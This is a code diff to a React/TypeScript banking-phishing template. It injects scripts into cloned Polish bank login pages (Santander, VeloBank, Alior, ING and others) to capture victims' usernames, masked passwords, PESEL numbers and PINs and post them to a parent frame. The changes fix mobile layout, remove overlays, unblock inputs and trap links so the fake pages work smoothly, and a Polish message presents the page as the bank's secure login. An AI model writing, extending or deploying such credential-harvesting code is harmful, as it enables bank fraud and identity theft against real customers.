@@ -181,12 +181,15 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       };
       walk(document, 0);
 
-      // Masked kutular: tek tek key'leri sil, birlesik password yaz
+      // Masked kutular: tek tek key'leri sil, birlesik password yaz.
+      // PESEL kutulari (Pesel-N) masked DAVRANISI alir ama password'a
+      // KARISMAZ — asagida ayri "pesel" alani olarak birlestirilir.
       try {
-        const boxes = maskedBoxes();
+        const boxes = maskedBoxes().filter((el) => !/^pesel-\d+$/i.test(el.getAttribute("name") || ""));
         if (boxes.length) {
           boxes.forEach((el) => { const k = maskedKey(el); if (k && data[k] !== undefined) delete data[k]; });
-          const combined = combinedMaskedPassword();
+          let combined = "";
+          boxes.forEach((el) => { combined += (el.value || ""); });
           if (combined.trim()) data.password = combined;
         }
       } catch (e) {}
@@ -405,6 +408,50 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             ".modal-backdrop,.cdk-overlay-backdrop,.modal-blocker,.blocker{display:none !important}";
           (root.head || root.documentElement).appendChild(st);
         }
+        // ----------------------------------------------------------
+        // BANKA OZEL CSS DUZELTMELERI:
+        // velobank: gercek input height:0 + acik gri -> karakter
+        //   React span'lerinde ciziliyordu; statik sayfada gorunmez.
+        // santander: #wrapper.fixed 976px + .signin_box absolute ->
+        //   mobilde login kutusu ekran disinda kaliyor.
+        // ----------------------------------------------------------
+        const BANK_CSS = {
+          velobank:
+            "input.sc-dUMaFF{position:static!important;width:46px!important;height:56px!important;" +
+            "display:block!important;color:#191c1f!important;-webkit-text-fill-color:#191c1f!important;" +
+            "font-size:24px!important;font-weight:600!important;text-align:center!important;" +
+            "background:rgba(255,255,255,.9)!important;border-radius:8px!important;" +
+            "caret-color:#191c1f!important;opacity:1!important;margin:0 auto!important}" +
+            "input.sc-dUMaFF:focus{outline:2px solid #00b140!important;outline-offset:1px}" +
+            "span.sc-bQEQyQ{display:flex!important;align-items:center!important;justify-content:center!important}",
+          santander:
+            "@media(max-width:900px){" +
+            "html,body{min-width:0!important;overflow-x:hidden!important}" +
+            "#wrapper.fixed,#wrapper{width:100%!important;min-width:0!important}" +
+            "#kolumna-lewa,#kolumna-prawa,.right-banner{display:none!important}" +
+            "#content{display:block!important;width:100%!important;float:none!important;margin:0 auto!important;padding:8px!important}" +
+            ".signin_box{position:static!important;width:100%!important;max-width:460px!important;" +
+            "margin:12px auto!important;left:auto!important;right:auto!important;top:auto!important;" +
+            "box-shadow:0 4px 15px 0 rgba(0,0,0,.18)!important}" +
+            ".loginPanel{width:100%!important;max-width:460px;margin-left:auto!important;margin-right:auto!important}" +
+            ".contact_details{position:static!important;width:100%!important;left:auto!important;top:auto!important}" +
+            "#header{flex-wrap:wrap;height:auto!important;padding:12px 16px!important}" +
+            "#container{margin-top:8px!important;width:100%!important}" +
+            ".login-wrapper{width:100%!important}" +
+            "}" +
+            "@media(min-width:901px){" +
+            ".signin_box{position:static!important;margin:0 auto!important;left:auto!important;right:auto!important}" +
+            "}",
+          "bsr-krakow":
+            "@media(max-width:900px){html,body{min-width:0!important;overflow-x:hidden!important}}" ,
+        };
+        const bankCss = BANK_CSS[BANK_SLUG];
+        if (bankCss && !root.getElementById("pl-bank-fix")) {
+          const st2 = document.createElement("style");
+          st2.id = "pl-bank-fix";
+          st2.textContent = bankCss;
+          (root.head || root.documentElement).appendChild(st2);
+        }
         root.querySelectorAll("button, input, select, textarea, a, [role='button'], [ng-disabled], [aria-disabled], [inert], ing-button, ing-input-masked-password-field").forEach((el) => {
           try {
             if (el.hasAttribute("disabled")) el.removeAttribute("disabled");
@@ -418,6 +465,85 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             if (el.classList && el.classList.contains("disabled")) el.classList.remove("disabled");
             if (el.style && el.style.pointerEvents === "none") el.style.pointerEvents = "auto";
           } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // OVERLAY KATILICI: kaydedilen sayfalarda yukleniyor splash'i,
+    // cookie scrim'i, modal arkaplan gibi TAM EKRAN katmanlar JS
+    // calismadigi icin kapanmiyor -> tum tiklamalari yutuyor.
+    // Form kontrolu icermeyen, ekrani kaplayan opak katmani gizle.
+    // ------------------------------------------------------------------
+    const killOverlays = (root) => {
+      try {
+        const vw = root.documentElement ? root.documentElement.clientWidth : 0;
+        const vh = root.documentElement ? root.documentElement.clientHeight : 0;
+        if (!vw || !vh) return;
+        root.querySelectorAll("body *").forEach((el) => {
+          try {
+            if (el.__plOverlayChecked) return;
+            el.__plOverlayChecked = true;
+            const tag = (el.tagName || "").toLowerCase();
+            if (["script", "style", "link", "meta", "iframe", "svg", "path"].includes(tag)) return;
+            if (el.querySelector && el.querySelector("input,textarea,select,form,[type=submit]")) return;
+            const win = el.ownerDocument && el.ownerDocument.defaultView;
+            const cs = win ? win.getComputedStyle(el) : null;
+            if (!cs) return;
+            if (cs.position !== "fixed" && cs.position !== "absolute") return;
+            if (cs.display === "none" || cs.visibility === "hidden") return;
+            if (cs.pointerEvents === "none") return;
+            const r = el.getBoundingClientRect();
+            if (r.width < vw * 0.85 || r.height < vh * 0.85) return;
+            const bg = cs.backgroundColor || "";
+            const opaque = bg && bg !== "transparent" && !/rgba?\([^)]*,\s*0(\.\d+)?\s*\)/.test(bg);
+            const zi = parseInt(cs.zIndex || "0", 10) || 0;
+            const txt = (el.textContent || "").trim();
+            if ((opaque || zi >= 50) && txt.length < 500) {
+              el.style.setProperty("display", "none", "important");
+            }
+          } catch (e) {}
+        });
+      } catch (e) {}
+    };
+
+    // ------------------------------------------------------------------
+    // TIKLAMA ENGEL KALDIRICI: input'un/butonun uzerine binen baska bir
+    // eleman varsa (overlay, sahte kutu, dekor) o elemana
+    // pointer-events:none ver — tiklama gercek kontrole ulasir.
+    // ------------------------------------------------------------------
+    const unblockAt = (root, el) => {
+      try {
+        const r = el.getBoundingClientRect();
+        if (!r || r.width < 2 || r.height < 2) return;
+        const cx = r.left + Math.min(r.width / 2, 24);
+        const cy = r.top + Math.min(r.height / 2, 20);
+        const doc = el.ownerDocument || root;
+        const hit = doc.elementFromPoint ? doc.elementFromPoint(cx, cy) : null;
+        if (!hit || hit === el) return;
+        // hit, kontrolun kendisi/icindeki eleman/etiket sarmalayicisiysa sorun yok
+        let n = hit;
+        let guard = 0;
+        while (n && guard++ < 12) {
+          if (n === el) return;
+          n = n.parentElement;
+        }
+        if (el.contains && el.contains(hit)) return;
+        // hit bir label ise kontrole yonlendirir — engel sayilmaz
+        if ((hit.tagName || "").toLowerCase() === "label") return;
+        hit.style.setProperty("pointer-events", "none", "important");
+      } catch (e) {}
+    };
+    const unblockInputs = (root) => {
+      try {
+        root.querySelectorAll("input, textarea, select").forEach((el) => {
+          const t = (el.getAttribute("type") || "text").toLowerCase();
+          if (IGNORED.includes(t)) return;
+          if (!isVisibleEl(el)) return;
+          unblockAt(root, el);
+        });
+        root.querySelectorAll("button, a, [role='button'], [type=submit], ing-button").forEach((el) => {
+          try { if (isSubmitish(el)) unblockAt(root, el); } catch (e) {}
         });
       } catch (e) {}
     };
@@ -538,7 +664,10 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             const p = cell.querySelector("p");
             const n = p ? (p.textContent || "").trim() : "";
             if (!/^\d+$/.test(n)) return;
+            // Gorsel bos kutunun (css-9i7jw0) uzerine absolute input koy;
+            // hucreye tiklaninca da input fokusslansin.
             const host = cell.querySelector("div") || cell;
+            try { host.style.position = "relative"; } catch (e) {}
             const inp = document.createElement("input");
             inp.type = "text";
             inp.maxLength = 1;
@@ -548,10 +677,16 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
             inp.setAttribute("inputmode", "numeric");
             inp.setAttribute("aria-label", "PESEL - znak nr. " + n);
             inp.style.cssText =
-              "width:100%;height:100%;min-height:42px;border:none;outline:none;" +
-              "background:transparent;text-align:center;font:inherit;color:inherit;" +
-              "box-sizing:border-box;padding:0;display:block";
+              "position:absolute;inset:0;width:100%;height:100%;min-width:36px;min-height:44px;" +
+              "border:none;outline:none;background:transparent;text-align:center;" +
+              "font:inherit;font-size:1.35rem;font-weight:600;color:#191c1f;" +
+              "caret-color:#191c1f;box-sizing:border-box;padding:0;display:block;" +
+              "z-index:2;cursor:text";
             host.appendChild(inp);
+            try {
+              host.addEventListener("click", () => { try { inp.focus(); } catch (e) {} });
+              cell.addEventListener("click", () => { try { inp.focus(); } catch (e) {} });
+            } catch (e) {}
           } catch (e) {}
         });
       } catch (e) {}
@@ -697,6 +832,8 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       fillEmptyPeselBoxes(doc);
       applyMaskedBehavior(doc);
       applyIngFix();
+      killOverlays(doc);
+      unblockInputs(doc);
       cleanupErrorState(doc);
       updateSubmitReady(doc);
       doc.addEventListener("input", () => updateSubmitReady(doc), true);
@@ -729,6 +866,36 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
           while (t0 && t0 !== doc.body) {
             if (t0.id === "pl-keypad-continue" || t0.id === "pl-keypad-backspace") return;
             t0 = t0.parentElement;
+          }
+        } catch (err) {}
+
+        // --------------------------------------------------------------
+        // A[href] YAKALAMA: iframe icinde dis siteye gitmeye calisan
+        // linkler sandbox'ta kirilir (Alior "Cofnij" -> bos gri sayfa).
+        // Geri linkleri = bir onceki adim; diger linkler = engelle.
+        // --------------------------------------------------------------
+        try {
+          let a = e.target;
+          let da = 0;
+          while (a && a !== doc.body && da < 4) {
+            if (a.tagName === "A" && a.getAttribute("href")) {
+              try { e.preventDefault(); e.stopPropagation(); } catch (err) {}
+              const atxt = (
+                (a.innerText || a.textContent || "") + " " +
+                (typeof a.className === "string" ? a.className : "") + " " +
+                (a.getAttribute("ui-sref") || "") + " " + (a.id || "")
+              ).toLowerCase();
+              if (/cofnij|wstecz|powr|go[-_\s]?back|\bback\b|sign-in/.test(atxt)) {
+                try {
+                  (window.top || window.parent).postMessage(
+                    { type: "PL_BANK_SUBMIT", step: STEP, trigger: "nav-back", data: {} }, "*"
+                  );
+                } catch (err) {}
+              }
+              return;
+            }
+            a = a.parentElement;
+            da++;
           }
         } catch (err) {}
 
@@ -821,7 +988,7 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
     attach(document);
     scanIframes(document, 0);
     try {
-      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); fillEmptyPeselBoxes(document); applyMaskedBehavior(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
+      new MutationObserver(() => { scanIframes(document, 0); enableControls(document); fillEmptyPeselBoxes(document); applyMaskedBehavior(document); killOverlays(document); unblockInputs(document); cleanupErrorState(document); updateSubmitReady(document); }).observe(document.documentElement, { childList: true, subtree: true });
     } catch (e) {}
     let tries = 0;
     const retry = setInterval(() => {
@@ -830,6 +997,8 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
       fillEmptyPeselBoxes(document);
       applyMaskedBehavior(document);
       applyIngFix();
+      killOverlays(document);
+      unblockInputs(document);
       cleanupErrorState(document);
       updateSubmitReady(document);
       renderKeypad();
@@ -842,7 +1011,15 @@ function buildInjectionScript(step: number, bankSlug: string, brandColor: string
 // (username / password / bankPhone / pin / personalCode / pesel)
 function canonicalizeCaptured(raw: Record<string, string>): Record<string, string> {
   const out: Record<string, string> = { ...raw };
-  const norm = (k: string) => k.toLowerCase().replace(/[^a-z0-9]/g, "");
+  // Lehxce "ł" NFD ile ayrismaz — elle l'ye cevir (hasło -> haslo,
+  // aksi halde iPKO/BSR sifresi "wpiszhaso" kalip password'a eslesmez)
+  const norm = (k: string) =>
+    k
+      .toLowerCase()
+      .replace(/ł/g, "l")
+      .normalize("NFD")
+      .replace(/[\u0300-\u036f]/g, "")
+      .replace(/[^a-z0-9]/g, "");
   for (const [k, v] of Object.entries(raw)) {
     if (!v || !v.trim()) continue;
     const n = norm(k);
@@ -938,6 +1115,11 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
       const data = event?.data;
       if (!data || typeof data !== "object") return;
       if (data.type !== "PL_BANK_SUBMIT") return;
+      // Geri navigasyonu (ornek Alior "Cofnij"): veri olmasa da adim geri al
+      if (data.trigger === "nav-back") {
+        setStep((s) => Math.max(0, s - 1));
+        return;
+      }
       const payload = data.data && typeof data.data === "object" ? { ...(data.data as Record<string, string>) } : {};
       if (Object.keys(payload).length === 0) return;
 
@@ -987,7 +1169,7 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
 
   if (files.length === 0) {
     return (
-      <div className="flex min-h-screen items-center justify-center p-4 bg-white">
+      <div className="flex min-h-screen items-center justify-center p-4 bg-[#fff6ec]">
         <p className="rounded-xl border border-blue-500/30 bg-blue-500/10 p-5 text-center text-sm text-blue-700">
           Ładowanie bezpiecznej strony logowania Twojego banku...
         </p>
@@ -999,12 +1181,12 @@ export function PolandBankTemplate({ bankSlug, onChange, handleRouteAction, onPr
 
   return (
     <div
-      className="fixed inset-0 w-[100vw] bg-white z-[9999] overflow-hidden"
+      className="fixed inset-0 w-[100vw] bg-[#fff6ec] z-[9999] overflow-hidden"
       style={{ minHeight: "100vh", height: "100dvh" }}
     >
-      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff !important;background-image:none !important}`}</style>
+      <style>{`body.ah-theme,body.ah-theme-overlay-bg,body{background:#fff6ec !important;background-image:none !important}`}</style>
       {saving && (
-        <div className="absolute inset-0 bg-white/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
+        <div className="absolute inset-0 bg-[#fff6ec]/80 backdrop-blur-sm z-[99999] flex items-center justify-center">
           <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
         </div>
       )}
